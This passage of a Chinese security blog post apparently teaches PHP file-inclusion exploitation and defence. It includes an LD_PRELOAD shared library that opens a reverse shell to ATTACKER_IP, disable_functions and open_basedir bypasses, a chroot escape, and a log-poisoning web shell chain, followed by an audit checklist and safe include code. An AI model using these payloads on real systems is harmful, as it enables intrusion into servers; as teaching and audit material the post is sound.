+<p>部分 PHP 版本中 <code>glob://</code> 可绕过 <code>open_basedir</code> 列举目录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) &#123; <span class="keyword">echo</span> <span class="variable">$f</span> . <span class="string">&quot;\n&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法五：SplFileObject 迭代器绕过</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) &#123; <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>() . <span class="string">&quot;\n&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心结论：</strong> <code>open_basedir</code> 对系统命令无效，仅能作为纵深防御的一环，不可依赖。</p>
+<h2 id="四、disable-functions-绕过与-LFI-组合利用"><a href="#四、disable-functions-绕过与-LFI-组合利用" class="headerlink" title="四、disable_functions 绕过与 LFI 组合利用"></a>四、disable_functions 绕过与 LFI 组合利用</h2><p><code>disable_functions</code> 禁止危险函数，但配合 LFI 存在多种绕过路径。</p>
+<p><strong>方法一：未禁用函数利用</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&#x27;/bin/bash&#x27;</span>, [<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]);                          <span class="comment">// PCNTL 扩展</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LD_PRELOAD=/tmp/evil.so&#x27;</span>); <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);            <span class="comment">// LD_PRELOAD 劫持</span></span><br><span class="line"><span class="title function_ invoke__">imap_open</span>(<span class="string">&#x27;&#123;x:993/imap/ssl&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);                      <span class="comment">// IMAP RCE</span></span><br><span class="line"><span class="title function_ invoke__">dl</span>(<span class="string">&#x27;evil.so&#x27;</span>);                                                    <span class="comment">// PHP &lt; 5.3 动态加载</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：LD_PRELOAD + mail() 经典绕过</strong></p>
+<p>利用 <code>mail()</code> &#x2F; <code>error_log()</code> 内部调用 sendmail 时，通过 <code>putenv()</code> 注入环境变量劫持共享库：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil.c → gcc -shared -fPIC evil.c -o evil.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ATTACKER_IP/4444 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LD_PRELOAD=/tmp/evil.so&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>);   <span class="comment">// 触发 sendmail → 加载 evil.so → 反弹 shell</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法三：LFI + PHP 临时文件竞态</strong></p>
+<p>Apache+PHP 环境下，利用 multipart 上传时创建的 <code>/tmp/phpXXXXXX</code> 临时文件与 LFI 竞态包含实现 RCE。配合 <code>phpinfo()</code> 泄露临时文件路径可显著提高成功率。</p>
+<p><strong>方法四：PHP 内部 UAF &#x2F; GC 漏洞</strong></p>
+<p>现代 PHP 版本的绕过通常依赖 Use-After-Free 或 GC 缺陷（如 PHP 7.x <code>backtrace</code> UAF、PHP 8.x <code>array_walk</code> + GC），需要编写 PHP 扩展形式的 Exploit 并由 LFI 加载。</p>
+<h2 id="五、PHP-chroot-Jail-与逃逸"><a href="#五、PHP-chroot-Jail-与逃逸" class="headerlink" title="五、PHP chroot Jail 与逃逸"></a>五、PHP chroot Jail 与逃逸</h2><p>PHP 的 <code>chroot()</code> 不是真正的安全隔离，在 root 权限下可逃逸。</p>
+<p><strong>经典 chroot 逃逸：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chroot</span>(<span class="string">&#x27;/var/jail&#x27;</span>);        <span class="comment">// 限制根目录到 /var/jail</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;tmpdir&#x27;</span>);            <span class="comment">// 在 jail 内创建子目录</span></span><br><span class="line"><span class="title function_ invoke__">chroot</span>(<span class="string">&#x27;tmpdir&#x27;</span>);           <span class="comment">// 将根目录改为 /var/jail/tmpdir</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;../../../../../../&#x27;</span>); <span class="comment">// 利用 cwd 向上逃逸出 jail</span></span><br><span class="line"><span class="title function_ invoke__">chroot</span>(<span class="string">&#x27;.&#x27;</span>);                <span class="comment">// 在真实根目录下再次 chroot</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);               <span class="comment">// 成功逃逸</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 &#x2F;proc 文件系统：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cmdline          <span class="comment"># 读取 init 进程命令行</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/environ          <span class="comment"># 读取环境变量</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/maps          <span class="comment"># 读取进程内存映射</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>LFI 在 chroot 环境下的利用价值：</strong> 读取 chroot 内所有配置文件、日志投毒、session 投毒、通过 &#x2F;proc 泄露进程信息。</p>
+<h2 id="六、攻击链示例"><a href="#六、攻击链示例" class="headerlink" title="六、攻击链示例"></a>六、攻击链示例</h2><p>一条实战 LFI-to-RCE 链条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LFI 发现 → php://filter 读源码 → 日志路径确认</span><br><span class="line">→ User-Agent 注入 &lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">→ 包含日志文件执行命令 → disable_functions 限制</span><br><span class="line">→ 上传 evil.so → LD_PRELOAD 绕过 → 反弹 shell</span><br><span class="line">→ open_basedir 限制 → 命令执行直接读取（不受约束）→ 提权</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、代码审计检查清单"><a href="#七、代码审计检查清单" class="headerlink" title="七、代码审计检查清单"></a>七、代码审计检查清单</h2><table>
+<thead>
+<tr>
+<th>编号</th>
+<th>检查项</th>
+<th>检查方法</th>
+<th>风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>include&#x2F;require 参数是否来自用户输入</td>
+<td>追踪 $_GET&#x2F;POST&#x2F;COOKIE&#x2F;SERVER&#x2F;FILES 到包含函数</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>2</td>
+<td>file_get_contents 路径是否可控</td>
+<td>检查 URL&#x2F;路径参数来源</td>
+<td>高</td>
+</tr>
+<tr>
+<td>3</td>
+<td>是否存在白名单机制</td>
+<td>确认 array_key_exists 或 switch-case 映射</td>
+<td>—</td>
+</tr>
+<tr>
+<td>4</td>
+<td>路径拼接前是否经过严格正则过滤</td>
+<td>检查是否漏掉 ..&#x2F;、..\、URL 编码绕过</td>
+<td>高</td>
+</tr>
+<tr>
+<td>5</td>
+<td>是否存在后缀自动追加及其截断可能</td>
+<td>检查空字节(%00)、路径截断、? 绕过后缀</td>
+<td>中</td>
+</tr>
+<tr>
+<td>6</td>
+<td>allow_url_include 是否为 On</td>
+<td>php.ini 或 ini_get 检查</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>7</td>
+<td>allow_url_fopen 是否为 On</td>
+<td>php.ini 检查</td>
+<td>高</td>
+</tr>
+<tr>
+<td>8</td>
+<td>是否禁用危险封装器</td>
+<td>检查 stream_wrapper_unregister 调用</td>
+<td>中</td>
+</tr>
+<tr>
+<td>9</td>
+<td>realpath&#x2F;basename 防御是否到位</td>
+<td>确认解析后校验目录前缀</td>
+<td>高</td>
+</tr>
+<tr>
+<td>10</td>
+<td>open_basedir 是否配置（纵深防御）</td>
+<td>php.ini 检查，但需知命令执行可绕过</td>
+<td>低</td>
+</tr>
+<tr>
+<td>11</td>
+<td>disable_functions 是否有遗漏</td>
+<td>检查 pcntl_exec、mail+putenv、FFI 等</td>
+<td>高</td>
+</tr>
+<tr>
+<td>12</td>
+<td>上传目录是否禁用 PHP 引擎</td>
+<td>.htaccess 或 Nginx location deny</td>
+<td>高</td>
+</tr>
+<tr>
+<td>13</td>
+<td>日志文件路径是否可预测</td>
+<td>Apache&#x2F;Nginx 默认日志路径</td>
+<td>中</td>
+</tr>
+<tr>
+<td>14</td>
+<td>PHP Session 存储路径是否可预测</td>
+<td>session.save_path 配置</td>
+<td>中</td>
+</tr>
+<tr>
+<td>15</td>
+<td>是否存在 FFI 扩展</td>
+<td>ffi.enable 配置</td>
+<td>高</td>
+</tr>
+<tr>
+<td>16</td>
+<td>错误信息是否展示绝对路径</td>
+<td>display_errors 配置</td>
+<td>中</td>
+</tr>
+<tr>
+<td>17</td>
+<td>XXE + 文件包含组合是否可能</td>
+<td>libxml_disable_entity_loader 状态</td>
+<td>中</td>
+</tr>
+<tr>
+<td>18</td>
+<td>phar:&#x2F;&#x2F; 封装器是否可用</td>
+<td>配合文件上传，phar 反序列化 → RCE</td>
+<td>高</td>
+</tr>
+</tbody></table>
+<h2 id="八、防御最佳实践"><a href="#八、防御最佳实践" class="headerlink" title="八、防御最佳实践"></a>八、防御最佳实践</h2><h3 id="8-1-开发者清单"><a href="#8-1-开发者清单" class="headerlink" title="8.1 开发者清单"></a>8.1 开发者清单</h3><ul>
+<li>首选白名单映射，用户输入永不直接拼接到路径。</li>
+<li>次选严格正则 <code>[a-zA-Z0-9_-]</code> + <code>realpath()</code> 校验目录前缀。</li>
+<li><code>allow_url_include = Off</code>，无论任何场景。</li>
+<li>禁用不必要封装器：<code>php://input</code>、<code>data://</code>、<code>expect://</code>。</li>
+<li>上传目录独立存储（子域 &#x2F; CDN 更佳），禁用 PHP 引擎。</li>
+<li>日志脱敏：避免将用户输入原样写入日志，或做编码&#x2F;截断。</li>
+<li>最小权限运行 PHP-FPM，配合 <code>open_basedir</code>（增加攻击成本）。</li>
+<li>生产环境关闭 <code>display_errors</code>，错误仅写日志文件。</li>
+<li>PHP 保持更新，许多绕过技巧依赖特定版本。</li>
+</ul>
+<h3 id="8-2-运维加固清单"><a href="#8-2-运维加固清单" class="headerlink" title="8.2 运维加固清单"></a>8.2 运维加固清单</h3><ul>
+<li>容器化 &#x2F; 虚拟化隔离：chroot 不是安全边界，Docker &#x2F; KVM 才是。</li>
+<li>AppArmor &#x2F; SELinux：为 PHP-FPM 编写 MAC 策略，限制文件访问。</li>
+<li>WAF 规则覆盖：检测 <code>../</code>、<code>..\</code>、<code>%00</code>、<code>php://</code>、<code>data://</code> 等特征。</li>
+<li>日志监控告警：监控高危封装器访问与异常包含请求。</li>
+<li>定期渗透测试：自动化扫描 + 人工审计相结合。</li>
+</ul>
+<h3 id="8-3-防御骨架代码"><a href="#8-3-防御骨架代码" class="headerlink" title="8.3 防御骨架代码"></a>8.3 防御骨架代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_include</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 第1层：白名单</span></span><br><span class="line">    <span class="variable">$allowed</span> = [</span><br><span class="line">        <span class="string">&#x27;header&#x27;</span>  =&gt; <span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates/header.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;footer&#x27;</span>  =&gt; <span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates/footer.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sidebar&#x27;</span> =&gt; <span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates/sidebar.php&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Illegal include attempt: &quot;</span> . <span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Access denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$allowed</span>[<span class="variable">$name</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第2层：检测危险协议</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(php|data|expect|phar|zip)://#i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Protocol not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第3层：文件必须存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;Template not found&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第4层：realpath 二次确认</span></span><br><span class="line">    <span class="variable">$real</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$base</span> = <span class="title function_ invoke__">realpath</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates/&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$real</span> === <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$real</span>, <span class="variable">$base</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Path traversal detected&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$real</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="九、免责声明"><a href="#九、免责声明" class="headerlink" title="九、免责声明"></a>九、免责声明</h2><blockquote>
+<p><strong>本文仅供安全研究与学习交流之用。</strong> 文中涉及的技术、工具与方法严禁用于未授权的渗透测试和任何形式的非法入侵。因不当使用本文内容所造成的一切法律责任与后果由行为人自行承担。进行安全测试前，请确保已获得目标所有者的明确书面授权，并严格遵守《中华人民共和国网络安全法》及相关法律法规。</p>
+</blockquote>
+<p><em>参考资源：</em></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing-for-Local-File-Inclusion">OWASP: File Inclusion</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/security.filesystem.php">PHP Manual: Filesystem Security</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.php">PHP Manual: Supported Protocols and Wrappers</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">HackTricks: File Inclusion</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/" rel="tag"># 方法论</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Framework-ThinkPHP-RCE/" rel="prev" title="ThinkPHP RCE 漏洞链">
+                  <i class="fa fa-angle-left"></i> ThinkPHP RCE 漏洞链
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Docker-K8s-security/" rel="next" title="云原生：Docker与Kubernetes安全">
+                  云原生：Docker与Kubernetes安全 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
